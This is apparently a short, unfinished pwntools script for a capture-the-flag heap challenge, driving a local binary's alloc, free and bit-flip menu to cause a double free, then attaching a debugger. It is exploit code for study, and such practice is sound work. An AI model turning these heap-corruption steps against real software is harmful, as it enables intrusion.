from pwn import *


def alloc(idx):
    p.sendlineafter(">","0")
    p.sendlineafter(">",str(idx))

def free(idx):
    p.sendlineafter(">","2")
    p.sendlineafter(">",str(idx))    

def flip(idx,bit):
    p.sendlineafter(">","1")
    p.sendlineafter(">",str(idx))
    p.sendlineafter(">",str(bit))


elf = context.binary = ELF("./chall")
p = process()


alloc(0)


free(0)
flip(0,64)
free(0)
alloc(1)

flip(0,0)
free(0)
alloc(1)
flip(0,1)



gdb.attach(p)



p.interactive()
